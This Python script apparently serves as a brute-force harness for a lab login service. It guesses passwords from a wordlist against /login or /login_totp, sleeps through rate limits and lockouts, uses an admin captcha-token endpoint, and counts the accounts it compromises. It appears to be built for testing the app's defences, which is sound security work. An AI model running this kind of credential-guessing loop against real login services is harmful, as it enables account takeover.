import argparse
import json
import time
from pathlib import Path
import sys

import pyotp
import requests

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.append(str(ROOT))

from app.config import load_config


CFG = load_config()


def load_secret(username: str) -> str | None:
    path = Path("data/users.json")
    if not path.exists():
        return None
    users = json.loads(path.read_text())
    for u in users:
        if u["username"] == username:
            return u.get("totp_secret")
    return None


def get_captcha_token(base_url: str) -> str | None:
    try:
        resp = requests.get(f"{base_url}/admin/get_captcha_token", params={"group_seed": CFG.group_seed}, timeout=5)
        if resp.status_code == 200:
            return resp.json().get("captcha_token")
    except Exception:
        return None
    return None


def attack(username: str, args):
    passwords = []
    if args.wordlist:
        passwords = [line.strip() for line in open(args.wordlist, "r", encoding="utf-8") if line.strip()]
    else:
        passwords = ["password", "123456", "letmein", "welcome", "Password1!"]

    totp_secret = load_secret(username)
    session = requests.Session()
    total = 0
    start = time.time()
    print(f"\n[*] Attacking user: {username}")
    for pwd in passwords:
        total += 1
        payload = {"username": username, "password": pwd}
        url = f"{args.base}/login"
        if args.totp and totp_secret:
            payload["totp_code"] = pyotp.TOTP(totp_secret).now()
            url = f"{args.base}/login_totp"

        resp = session.post(url, json=payload, timeout=5)
        print(resp)
        data = resp.json()
        result = data.get("result")
        print(f"[{total}] {pwd} -> {result}")

        if result == "rate_limit_exceeded":
            sleep_time = CFG.rate_limit_window_s
            print(f"[!] Rate limit exceeded, sleeping for {sleep_time}s...")
            time.sleep(sleep_time)
            # Retry the same password after sleep
            resp = session.post(url, json=payload, timeout=5)
            data = resp.json()
            result = data.get("result")
            print(f"[{total}] {pwd} (retry after rate limit) -> {result}")

        if result == "locked_out":
            sleep_time = data.get("lockout_remaining") or CFG.lockout_duration_s
            print(f"[!] Account locked out, sleeping for {sleep_time}s...")
            time.sleep(sleep_time)
            # Retry the same password after sleep
            resp = session.post(url, json=payload, timeout=5)
            data = resp.json()
            result = data.get("result")
            print(f"[{total}] {pwd} (retry after lockout) -> {result}")

        if result == "success":
            duration = time.time() - start
            print(f"[+] Success for {username} after {total} attempts in {duration:.2f}s")
            return True

        if data.get("captcha_required"):
            token = get_captcha_token(args.base)
            if token:
                payload["captcha_token"] = token
                resp = session.post(url, json=payload, timeout=5)
                data = resp.json()
                captcha_result = data.get("result")
                print(f"captcha retry -> {captcha_result}")
                
                if captcha_result == "rate_limit_exceeded":
                    sleep_time = CFG.rate_limit_window_s
                    print(f"[!] Rate limit exceeded on captcha retry, sleeping for {sleep_time}s...")
                    time.sleep(sleep_time)
                    # Retry with captcha after sleep
                    resp = session.post(url, json=payload, timeout=5)
                    data = resp.json()
                    captcha_result = data.get("result")
                    print(f"captcha retry (after rate limit) -> {captcha_result}")
                
                if captcha_result == "locked_out":
                    sleep_time = data.get("lockout_remaining") or CFG.lockout_duration_s
                    print(f"[!] Account locked out on captcha retry, sleeping for {sleep_time}s...")
                    time.sleep(sleep_time)
                    # Retry with captcha after sleep
                    resp = session.post(url, json=payload, timeout=5)
                    data = resp.json()
                    captcha_result = data.get("result")
                    print(f"captcha retry (after lockout) -> {captcha_result}")
                
                if captcha_result == "success":
                    duration = time.time() - start
                    print(f"[+] Success for {username} after {total} attempts in {duration:.2f}s (with captcha)")
                    return True
    print(f"[-] No success for {username}")
    return False


def main():
    parser = argparse.ArgumentParser(description="Brute-force one or more accounts")
    parser.add_argument("username", nargs="+", help="username(s) to attack")
    parser.add_argument("--wordlist", help="path to wordlist")
    parser.add_argument("--base", default="http://127.0.0.1:8000", help="API base URL")
    parser.add_argument("--totp", action="store_true", help="use /login_totp with TOTP if secret known")
    args = parser.parse_args()
    
    success_count = 0
    for username in args.username:
        if attack(username, args):
            success_count += 1
    
    print(f"\n[*] Summary: {success_count}/{len(args.username)} user(s) compromised")


if __name__ == "__main__":
    main()
